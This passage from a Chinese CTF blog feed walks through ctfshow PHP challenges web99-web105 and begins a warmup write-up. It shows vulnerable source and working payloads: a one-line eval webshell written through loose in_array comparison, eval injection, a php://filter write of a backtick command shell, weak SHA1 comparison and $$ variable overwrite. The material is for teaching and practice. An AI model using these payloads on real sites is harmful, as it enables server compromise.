class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>array_push()函数<br>将一个或多个单元压入数组的末尾（入栈）<br><code>array_push(array &amp;$array, mixed $value1, mixed $... = ?): int</code><br>array_push() 将 array 当成一个栈，并将传入的变量压入 array 的末尾。array 的长度将根据入栈变量的数目增加。</p></li><li><p>in_array()函数<br>检查数组中是否存在某个值<br><code>in_array(mixed $needle, array $haystack, bool $strict = false): bool</code><br>如果没有设置 strict 则使用宽松的比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">needle</span><br><span class="line">待搜索的值。</span><br><span class="line">注意:</span><br><span class="line">如果 needle 是字符串，则比较是区分大小写的。</span><br><span class="line">haystack</span><br><span class="line">待搜索的数组。</span><br><span class="line">strict</span><br><span class="line">如果第三个参数 strict 的值为 true 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。</span><br><span class="line">注意:</span><br><span class="line">在 PHP 8.0.0 之前，string needle 在非严格模式下将会匹配数组中的值 0，反之亦然。这可能会导致不希望的结果。其它类型也存在类似的边缘情况。如果不是绝对确定有关值的类型，请始终使用 strict flag 以避免意外行为。</span><br></pre></td></tr></table></figure></li><li><p>file_put_contents()函数<br>将数据写入文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(</span><br><span class="line">    string $filename,</span><br><span class="line">    mixed $data,</span><br><span class="line">    int $flags = 0,</span><br><span class="line">    ?resource $context = null</span><br><span class="line">): int|false</span><br></pre></td></tr></table></figure><p>如果 filename 不存在，将会创建文件。反之，存在的文件将会重写，除非设置 FILE_APPEND flag。</p></li></ul><p>通过该源码可知，将随机数放入数组$allow里。<br>get型传参的值与数组$allow作比较，如果在里面，就通过post传参变量content写入文件名变量n内。<br>即创造一个文件，文件名为变量n的值，文件内容为变量content的值。</p><ol start="2"><li>构造payload<br>由于in_array数组有缺陷，会把1.php解析为1，由此我们可构造出一个php文件，通过post传参传入一句话木马：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET: ?n=1.php    POST: content:&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>因为是随机数，所以1不一定每次都在数组中，如果失败多试几次便可。<br>然后我们再访问： <code>url/1.php</code><br>成功后打开蚁剑，连接这个url，密码为1。<br>之后找到flag36d.php文件，拿到flag。</li></ol><h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>is_numeric()函数<br>检测变量是否为数字或数字字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_numeric(mixed $value): bool</span><br><span class="line">如果 value 是数字或数字字符串， 返回 true，否则返回 false。</span><br></pre></td></tr></table></figure></li><li><p>eval()函数<br>把字符串作为PHP代码执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(string $code): mixed</span><br><span class="line">返回值</span><br><span class="line">eval() 返回 null，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。 PHP 7 开始，执行的代码里如果有一个 parse error，eval() 会抛出 ParseError 异常。在 PHP 7 之前， 如果在执行的代码中有 parse error，eval() 返回 false，之后的代码将正常执行。无法使用 set_error_handler() 捕获 eval() 中的解析错误。</span><br></pre></td></tr></table></figure></li></ul><p>通过该源码可知，我们需要通过GET方式传入3个参数，并且将判断三个参数是否为数字或数字字符串。<br>检测v2和v3是否具有那些过滤的值，然后用eval函数输出为代码。</p><ol start="2"><li>构造payload<br>这里的考点是运算符的优先级，由于在v0这一行代码的比较中，等于（&#x3D;）符号的优先级高于and符号，因此代码会执行为判断v1是否为数字，返回的布尔值传到v0，而v2，v3的判断并没有传入。因此我们可以输入任意v2，v3的字符。<br>由于eval将括号内的字符执行为代码，我们可以用var_dump函数打印出flag，于是构造payload如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</span><br></pre></td></tr></table></figure>最终拿到flag</li></ol><h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相比于上一关，本关的黑名单更多，用一般的函数无法拿到flag，于是我们需要想办法使用其它方法。</p></li><li><p>构造语句<br>可以使用ReflectionClass类来显示出flag，ReflectionClass 类报告了一个类的有关信息。<br><a href="https://www.php.net/manual/zh/class.reflectionclass.php">ReflectionClass 类 </a><br>构造示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><p>由于hint说flag最后少了一位，因此需要最后爆破16次。<br>拿到flag</p></li></ol><h1 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>substr()函数<br>返回字符串的子串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">substr(string $string, int $offset, ?int $length = null): string</span><br><span class="line">string</span><br><span class="line">输入字符串。</span><br><span class="line">offset</span><br><span class="line">如果 offset 是非负数，返回的字符串将从 string 的 offset 位置开始，从 0 开始计算。</span><br><span class="line">例如，在字符串 “abcdef” 中，在位置 0 的字符是 “a”，位置 2 的字符串是 “c” 等等。</span><br><span class="line">如果 offset 是负数，返回的字符串将从 string 结尾处向前数第 offset 个字符开始。</span><br><span class="line">如果 string 的长度小于 offset，将返回空字符串。</span><br><span class="line">length</span><br><span class="line">如果提供了正数的 length，返回的字符串将从 offset 处开始最多包括 length 个字符（取决于 string 的长度）。</span><br><span class="line">如果提供了负数的 length，那么 string 末尾处的 length 个字符将会被省略（若 offset 是负数则从字符串尾部算起）。</span><br><span class="line">如果 offset 不在这段文本中，那么将返回空字符串。</span><br><span class="line">如果提供了值为 0 的 length，那么将返回一个空字符串。</span><br><span class="line">如果忽略 length 或为 null，返回的子字符串将从 offset 位置开始直到字符串结尾。</span><br></pre></td></tr></table></figure></li><li><p>call_user_func()函数<br>把第一个参数作为回调函数调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(callable $callback, mixed ...$args): mixed</span><br><span class="line">callback</span><br><span class="line">将被调用的回调函数</span><br><span class="line">args</span><br><span class="line">0个或以上的参数，被传入回调函数。</span><br></pre></td></tr></table></figure></li><li><p>hex2bin()函数<br>转换十六进制字符串为ASCII字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hex2bin(string $string): string|false</span><br><span class="line">string</span><br><span class="line">十六进制表示的数据</span><br><span class="line">返回值</span><br><span class="line">返回给定数据的ASCII字符串表示 或者在失败时返回 false。</span><br></pre></td></tr></table></figure></li></ul><p>根据源码可知，传入1个POST参数v1，2个GET参数v2,v3<br>根据v4的表达式，可知v2必须为数字或数字字符串（可以使用科学计数法）。v3不受限制。<br>从第3个数字开始截取v2一直到结尾，送给变量s。<br>调用call_user_func()函数，将v3作为函数名调用，传入s作为参数。得到的值赋给变量str。<br>最后v3作为文件名，变量str的值写入v3文件中。</p><ol start="2"><li>构造payload<br>由于is_numeric()函数只允许使用数字和e（科学计数法），不能包含其它字符，所以需要构造仅含数字和e的参数。<br>由此我们可以想到把内容通过base64加密，之后转化为16进制字符串，找到符合条件的语句。<br>最终我们通过下面代码找到了：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&lt;?=`cat *`;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);  <span class="comment">// $b=&quot;PD89YGNhdCAqYDs=&quot;,由于等号(=)只是作为填充位，不影响最终结果，因此可以删去 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;PD89YGNhdCAqYDs&quot;</span>);  <span class="comment">// $c=5044383959474e6864434171594473,符合条件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>由于是从v2的第3位开始截取，因此前两位需要填充任意数字，最终得到v2为：<br><code>005044383959474e6864434171594473</code><br>由于file_put_contents()函数允许使用伪协议，于是通过PHP伪协议写入文件，因此我们可以将v3构造为：<br><code>php://filter/write=convert.base64-decode/resource=a.php</code><br>v1为POST传参：<br><code>hex2bin</code></li></ol><p>构造完成后提交，访问a.php，查看源代码。<br>即可拿到flag</p><h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><p>和web102相同</p><h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><p>很简单，要两个SHA1值相同，但没有验证本身值是否不同，因此直接传入两个相同的值即可拿到flag。<br>但本意应该是考察SHA1加解密的缺陷：<br>sha1()函数无法处理数组类型，将报错并返回false<br>sha1()函数的弱相等<br>或者用科学计数法（0exxx）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1=aaK1STfY    //0e76658526655756207688271159624026011393</span><br><span class="line">v2=aaO8zKZF    //0e89257456677279068558073954252716165668</span><br></pre></td></tr></table></figure><p>最简单的payload:<br>GET:v1&#x3D;1<br>POST:v2&#x3D;1<br>拿到flag</p><h1 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>error_reporting()函数<br>设置应该报告何种 PHP 错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(?int $error_level = null): int</span><br><span class="line">error_reporting() 函数能够在运行时设置 error_reporting 指令。</span><br><span class="line">PHP 有诸多错误级别，使用该函数可以设置在脚本运行时的级别。</span><br><span class="line">如果没有设置可选参数 error_level， error_reporting() 仅会返回当前的错误报告级别。</span><br><span class="line">// 关闭所有PHP错误报告</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">// Report simple running errors</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line"></span><br><span class="line">// 报告 E_NOTICE (报告未初始化的变量</span><br><span class="line">// 或者捕获变量名的错误拼写)</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);</span><br><span class="line"></span><br><span class="line">// 除了 E_NOTICE，报告其他所有错误</span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line">// 报告所有 PHP 错误</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line">// 报告所有 PHP 错误</span><br><span class="line">error_reporting(-1);</span><br><span class="line"></span><br><span class="line">// 和 error_reporting(E_ALL); 一样</span><br><span class="line">ini_set(&#x27;error_reporting&#x27;, E_ALL);</span><br></pre></td></tr></table></figure></li><li><p>foreach<br>foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">foreach (iterable_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (iterable_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br><span class="line">第一种格式遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的值被赋给 $value。</span><br><span class="line">第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。</span><br><span class="line">注意 foreach 不会修改类似 current() 和 key() 函数所使用的数组内部指针。</span><br><span class="line">还能够自定义遍历对象。</span><br><span class="line">可以很容易地通过在 $value 之前加上 &amp; 来修改数组的元素。此方法将以引用赋值而不是拷贝一个值。</span><br></pre></td></tr></table></figure></li><li><p>die()函数<br>等同于exit(), 输出一个消息并且退出当前脚本。</p></li><li><p>$$变量覆盖<br><a href="https://www.ineedyou.xyz/archives/87/">变量覆盖的知识</a></p></li></ul><p>从源码可以看出，我们GET不能传: <code>error=xx</code>  POST不能传: <code>xxx=flag</code><br>并且GET传参和POST传参均会进行变量覆盖。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br></pre></td></tr></table></figure><p>这条if语句如果不饶过，就不能使用变量error。若想要绕过要么已知flag的值，要么设置值为空。<br>看需求是否用到error考虑需不需要绕过。</p><ol start="2"><li>构造payload<br>分析源码后，我们GET需要传入：<br><code>suces=flag</code><br>这样做的目的是为了将变量flag的值传入变量suces，并且变量flag的值被清空。<br>并且POST传入：<br><code>error=suces</code><br>这样一来， <code>$_POST[&#39;flag&#39;]==$flag</code> 便返回false，最终if语句将执行die函数。<br>而变量error的值为suces的值，即原来flag的值。那么将会输出flag。<br>这样就拿到flag了。</li></ol><p>或者POST也可以为：<br><code>flag=</code><br>这样一来， <code>$_POST[&#39;flag&#39;]==$flag</code> 便返回true，最终if语句不会执行die函数。<br>转而继续往下执行，最后输出变量suces的值，也即flag的值（因为已经变量覆盖了，$flag就是$suces）<br>最终拿到flag</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;为了继续巩固php基础！&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/categories/CTF/PHP/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-warmup</title>
    <link href="http://example.com/2022/12/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-warmup/"/>
    <id>http://example.com/2022/12/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-warmup/</id>
    <published>2022-12-14T16:00:00.000Z</published>
    <updated>2022-12-15T06:30:14.804Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自己的缺陷在于对于php代码还不甚熟练</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>后台扫描<br>使用DirBuster工具扫描，可知source.php可以打开。<br>打开后是一段php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span 